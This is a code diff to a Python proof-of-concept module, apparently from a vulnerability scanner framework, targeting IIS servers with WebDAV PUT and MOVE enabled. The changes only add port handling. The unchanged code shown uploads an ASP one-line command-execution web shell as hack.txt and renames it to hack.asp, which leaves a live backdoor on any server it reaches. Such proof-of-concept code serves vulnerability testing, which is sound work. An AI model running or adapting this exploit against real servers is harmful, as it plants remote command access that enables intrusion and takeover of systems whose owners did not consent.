@@ -2,7 +2,7 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import httplib
+import httplib, urlparse, socket
 import sys
 
 class Vuln(ABVuln):
@@ -32,8 +32,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            conn = httplib.HTTPConnection(self.target)
+            target_parse = urlparse.urlparse(self.target)
+            # host = socket.gethostbyname(target_parse.hostname)
+            port = target_parse.port if target_parse.port else 80
+
+            conn = httplib.HTTPConnection(self.target, port)
             conn.request(method='OPTIONS', url='/')
             headers = dict(conn.getresponse().getheaders())
             #if headers.get('server', '').find('Microsoft-IIS') < 0:
@@ -43,18 +46,15 @@ class Poc(ABPoc):
                 headers['public'].find('PUT') > 0 and \
                 headers['public'].find('MOVE') > 0:
                 conn.close()
-                conn = httplib.HTTPConnection(self.target)
+                conn = httplib.HTTPConnection(self.target, port)
                 # PUT hack.txt
                 conn.request( method='PUT', url='/hack.txt', body='<%execute(request("cmd"))%>' )
                 conn.close()
-                conn = httplib.HTTPConnection(self.target)
+                conn = httplib.HTTPConnection(self.target, port)
                 # mv hack.txt to hack.asp
                 conn.request(method='MOVE', url='/hack.txt', headers={'Destination': '/hack.asp'})
                 #print 'ASP webshell:', 'http://' + sys.argv[1] + '/hack.asp'
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
-            else:
-                #print 'Server not vulnerable'
-                pass
                     
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
